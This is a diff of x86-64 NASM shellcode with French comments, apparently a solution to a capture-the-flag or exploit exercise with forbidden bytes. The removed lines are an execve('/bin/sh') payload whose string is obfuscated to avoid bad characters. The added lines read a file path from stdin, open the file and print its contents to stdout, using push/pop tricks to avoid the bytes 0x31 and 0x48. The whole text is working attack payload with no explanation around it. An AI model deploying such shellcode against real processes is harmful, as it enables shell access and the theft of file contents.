@@ -1,22 +1,50 @@
 [SECTION .TEXT]
 	global _main
 _main:
-; -cin-sh(01)
-; /bin/sh(00)
-	push 0x6e69632d
-	mov dword [rsp+4], 0x0168732d
-	inc byte [rsp]
-	inc byte [rsp]
-	dec byte [rsp+1]
-	inc byte [rsp+4]
-	inc byte [rsp+4]
-	dec byte [rsp+7]				; "/bin/sh"
-	;mov dl, byte [rsp+7]
-	push 0
-    pop rdx                 ; rdx = NULL
-    push 0
-    pop rsi                 ; rsi = NULL
+	push byte 1
+	pop rbx
+	dec bl              ; rbx = 0, évite les caractères 0x31 et 0x48. 
 
-    push 59
-    pop rax
-    syscall
+	push rbx
+	pop rax             ; rax = 0 
+
+	push rbx
+	pop rdi             ; stdin est 0
+
+	push rsp            
+	pop rsi             
+
+	push byte 24        ; lire 24 bytes
+	pop rdx
+	syscall
+
+	push rbx
+	pop rax
+	inc al
+	inc al              ; syscall open
+
+	;xchg rsi, rdi      ; attention à 0x48 caractère interdit
+	push rdi            ; on va faire un swap comme mentionné dans le readme
+	push rsi
+	pop rdi             ; rdi pointe vers le chemin du fichier
+	pop rsi             ; rsi est a 0 (flag O_RDONLY)
+
+	syscall
+						; swap de 3 registres
+	push rax            ; fd of just opened file
+	push rsi            ; rsi = 0
+	push rdi            ; rdi = pointeur au top du stack
+	pop rsi             ; rsi = buf
+	pop rax             ; rax = 0 syscall read
+	pop rdi             ; rdi = fd
+
+	push byte 127
+	pop rdx             ; Nombre de byte à lire
+	syscall             ; syscall read
+
+	push rbx
+	pop rax
+	inc al              ; syscall write
+	push rax            ; copy rax (==1) à rdi
+	pop rdi             ; 1 = stdout
+	syscall
